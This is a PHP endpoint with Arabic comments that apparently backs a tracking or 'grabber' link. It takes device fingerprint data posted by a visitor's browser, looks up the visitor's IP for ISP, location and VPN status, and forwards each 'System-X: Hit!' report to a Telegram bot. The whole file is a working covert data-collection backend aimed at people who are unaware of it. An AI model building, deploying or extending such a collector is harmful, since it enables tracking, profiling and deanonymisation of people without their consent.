<?php
// 1. تفعيل عرض الأخطاء في اللوجات عشان نشوفها المرة الجاية
ini_set('display_errors', 1);
error_reporting(E_ALL);

require_once 'config.php';
require_once 'telegram.php';

$json = file_get_contents('php://input');
$d = json_decode($json, true);

if ($d) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ip = explode(',', $ip)[0];

    // 2. محاولة جلب البيانات بسرعة قصوى (مهلة ثانية واحدة فقط)
    $isp = "Unknown"; $loc = "Unknown"; $vpn = "Unknown";
    try {
        $ctx = stream_context_create(['http' => ['timeout' => 1.2]]); 
        $apiRaw = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,hosting", false, $ctx);
        if ($apiRaw) {
            $api = json_decode($apiRaw, true);
            if ($api && $api['status'] === 'success') {
                $isp = $api['isp'] ?? 'Unknown';
                $loc = ($api['city'] ?? '') . ", " . ($api['country'] ?? '');
                $vpn = ($api['hosting'] ?? false) ? "نعم 🔴" : "لا 🟢";
            }
        }
    } catch (Exception $e) { /* كمل لو فشل */ }

    // 3. بناء الرسالة (تأكد إن المتغيرات موجودة عشان ميعملش Error)
    $msg = "🎯 <b>System-X: Hit!</b>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
    $msg .= "🏢 <b>ISP:</b> <code>$isp</code>\n";
    $msg .= "🛡️ <b>VPN:</b> $vpn\n\n";
    
    $msg .= "📱 <b>Device:</b> <code>" . ($d['model'] ?? 'N/A') . "</code>\n";
    $msg .= "⚙️ <b>CPU:</b> <code>" . ($d['hw']['cores'] ?? '0') . "</code> | <b>RAM:</b> <code>" . ($d['hw']['ram'] ?? '0') . "GB</code>\n";
    $msg .= "🔋 <b>Battery:</b> <code>" . ($d['bat']['level'] ?? 'N/A') . "%</code>\n\n";
    
    $msg .= "🔗 <b>UA:</b> <code>" . substr($d['ua'], 0, 100) . "...</code>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    $msg .= "👨‍💻 <b>Dev: @" . DEV_USERNAME . "</b>";

    // 4. إرسال لـ تليجرام
    sendTelegramMessage($msg);
    
    // سطر للوجات السيرفر عشان نتأكد إن العملية تمت
    error_log("System-X: Data sent for IP $ip");
} else {
    error_log("System-X: Received empty or invalid JSON");
}
?>
